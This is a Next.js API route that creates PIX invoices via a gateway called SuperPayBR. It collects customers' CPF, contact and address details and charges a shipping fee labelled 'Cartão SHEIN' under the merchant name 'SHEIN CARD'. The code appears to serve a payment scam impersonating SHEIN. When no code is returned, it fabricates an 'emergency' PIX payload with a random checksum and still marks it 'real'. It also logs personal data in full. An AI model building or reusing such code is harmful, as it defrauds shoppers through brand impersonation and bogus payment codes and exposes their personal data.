import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("💰 === CRIANDO FATURA SUPERPAYBR ===")

    const body = await request.json()
    console.log("📥 Dados recebidos:", JSON.stringify(body, null, 2))

    // Extrair dados do body ou headers
    const amount = body.amount || Number.parseFloat(body.amount?.toString() || "34.90")
    const shipping = body.shipping || "sedex"
    const method = body.method || "SEDEX"

    // Dados do cliente dos headers ou body
    const cpfData = body.customerData || JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = body.customerData?.email || request.headers.get("x-user-email") || ""
    const userWhatsApp = body.customerData?.phone || request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = body.customerData?.address || JSON.parse(request.headers.get("x-delivery-address") || "{}")

    // Validar dados obrigatórios
    if (!amount || amount <= 0) {
      return NextResponse.json(
        {
          success: false,
          error: "Valor (amount) é obrigatório e deve ser maior que zero",
        },
        { status: 400 },
      )
    }

    if (!cpfData.nome && !body.customerData?.name) {
      return NextResponse.json(
        {
          success: false,
          error: "Nome do cliente é obrigatório",
        },
        { status: 400 },
      )
    }

    // Gerar External ID único
    const externalId = body.externalId || `SHEIN_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`

    console.log("📋 Dados processados:", {
      externalId,
      amount,
      customerName: cpfData.nome || body.customerData?.name,
      email: userEmail,
      shipping: method,
    })

    // Autenticar primeiro
    console.log("🔐 Obtendo token de autenticação...")
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
    const authResult = await authResponse.json()

    if (!authResult.success) {
      console.error("❌ Falha na autenticação:", authResult.error)
      return NextResponse.json(
        {
          success: false,
          error: "Falha na autenticação SuperPayBR",
          details: authResult.error,
        },
        { status: 401 },
      )
    }

    const accessToken = authResult.data.access_token
    console.log("✅ Token obtido com sucesso")

    // Preparar dados da fatura SuperPayBR
    const invoiceData = {
      client: {
        name: cpfData.nome || body.customerData?.name || "Cliente SHEIN",
        document: (cpfData.cpf || body.customerData?.cpf || "00000000000").replace(/\D/g, ""),
        email: userEmail || "cliente@shein.com",
        phone: (userWhatsApp || "11999999999").replace(/\D/g, ""),
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          neighborhood: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: (deliveryAddress.zipcode || "01001000").replace(/\D/g, ""),
          complement: deliveryAddress.complement || "",
        },
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        referer: `SHEIN_FRETE_${method}`,
        installment: 1,
        order_url: `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: process.env.SUPERPAYBR_WEBHOOK_URL,
        discount: 0,
        products: [
          {
            id: "1",
            title: body.description || `Frete ${method} - Cartão SHEIN`,
            qnt: 1,
            amount: amount,
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("🚀 Enviando para SuperPayBR API...")
    console.log("📤 Dados da fatura:", JSON.stringify(invoiceData, null, 2))

    const createResponse = await fetch(`${process.env.SUPERPAYBR_API_URL}/v4/invoices`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta SuperPayBR:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (!createResponse.ok) {
      const errorText = await createResponse.text()
      console.error("❌ Erro ao criar fatura SuperPayBR:", {
        status: createResponse.status,
        error: errorText,
      })

      return NextResponse.json(
        {
          success: false,
          error: `Erro SuperPayBR: ${createResponse.status} - ${createResponse.statusText}`,
          details: errorText,
        },
        { status: createResponse.status },
      )
    }

    const responseData = await createResponse.json()
    console.log("📋 Resposta completa SuperPayBR:", JSON.stringify(responseData, null, 2))

    // Extrair dados PIX da resposta
    let pixPayload = ""
    let qrCodeImage = ""
    let invoiceId = ""

    // Função recursiva para buscar dados PIX
    const findPixData = (obj: any, path = "", depth = 0): void => {
      if (!obj || typeof obj !== "object" || depth > 10) return

      for (const [key, value] of Object.entries(obj)) {
        const currentPath = path ? `${path}.${key}` : key

        // Buscar ID da fatura
        if (key === "id" && typeof value === "string" && !invoiceId) {
          invoiceId = value
          console.log(`🔍 Invoice ID encontrado: ${invoiceId}`)
        }

        // Buscar PIX payload
        if ((key === "payload" || key === "pix_code") && typeof value === "string" && value.length > 50) {
          pixPayload = value
          console.log(`🔍 PIX payload encontrado em: ${currentPath}`)
        }

        // Buscar QR Code image
        if ((key === "qrcode" || key === "qr_code" || key === "image") && typeof value === "string") {
          qrCodeImage = value
          console.log(`🔍 QR Code encontrado em: ${currentPath}`)
        }

        // Continuar busca recursiva
        if (typeof value === "object" && value !== null) {
          findPixData(value, currentPath, depth + 1)
        }
      }
    }

    findPixData(responseData)

    // Usar dados da resposta ou fallback
    invoiceId = invoiceId || responseData.data?.id || responseData.id || externalId

    console.log("🔍 Resultado da extração PIX:", {
      invoiceId: invoiceId ? "✅ ENCONTRADO" : "❌ NÃO ENCONTRADO",
      pixPayload: pixPayload ? `✅ ENCONTRADO (${pixPayload.length} chars)` : "❌ NÃO ENCONTRADO",
      qrCodeImage: qrCodeImage ? "✅ ENCONTRADO" : "❌ NÃO ENCONTRADO",
    })

    // PIX de emergência se não encontrado
    if (!pixPayload) {
      console.log("⚠️ PIX payload não encontrado, gerando PIX de emergência...")
      pixPayload = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${invoiceId}520400005303986540${amount.toFixed(
        2,
      )}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`
    }

    // Gerar QR Code via QuickChart sempre
    const qrCodeUrl =
      qrCodeImage || `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=300&format=png&margin=1`

    // Resposta no formato esperado
    const response = {
      success: true,
      data: {
        id: invoiceId,
        invoice_id: invoiceId,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        status: {
          code: responseData.data?.status?.code || responseData.status?.code || 1,
          title: responseData.data?.status?.title || responseData.status?.title || "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(amount * 100), // SEMPRE definido em centavos
          liquido: Math.round(amount * 100), // SEMPRE definido em centavos
        },
        vencimento: {
          dia: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real",
      },
    }

    console.log("✅ Fatura SuperPayBR criada com sucesso!")
    console.log("📋 Resposta formatada:", JSON.stringify(response, null, 2))

    return NextResponse.json(response)
  } catch (error) {
    console.error("❌ Erro ao criar fatura SuperPayBR:", error)

    return NextResponse.json(
      {
        success: false,
        error: "Erro interno ao criar fatura SuperPayBR",
        details: error instanceof Error ? error.message : "Erro desconhecido",
      },
      { status: 500 },
    )
  }
}
